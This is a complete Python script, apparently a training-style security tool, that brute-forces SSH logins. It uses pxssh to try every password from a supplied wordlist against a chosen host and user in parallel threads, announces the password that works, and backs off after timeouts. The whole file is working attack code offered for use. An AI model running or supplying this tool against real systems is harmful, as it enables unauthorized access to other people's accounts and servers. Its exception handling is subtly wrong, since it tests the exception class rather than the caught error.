#! /usr/bin/env python3

from pexpect import pxssh
import optparse
import time
from threading import *
from print_color import print

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password Found:" + password, color="green")
        Found = True
    except Exception:
        if "read_nonblocking" in str(Exception):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(Exception):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser(
        "%prog " + "-H <target host> -u <user> -F <password list>"
    )
    parser.add_option("-H", dest="tgtHost", type="string", help="specify target host")
    parser.add_option(
        "-F", dest="passwdFile", type="string", help="specify password file"
    )
    parser.add_option("-u", dest="user", type="string", help="specify the user")
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile, "r")
    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found", color="green")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts", color="red")
            exit(0)
        connection_lock.acquire()
        password = line.strip("\r").strip("\n")
        print("[-] Testing: " + str(password), color="blue")
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == "__main__":
    main()
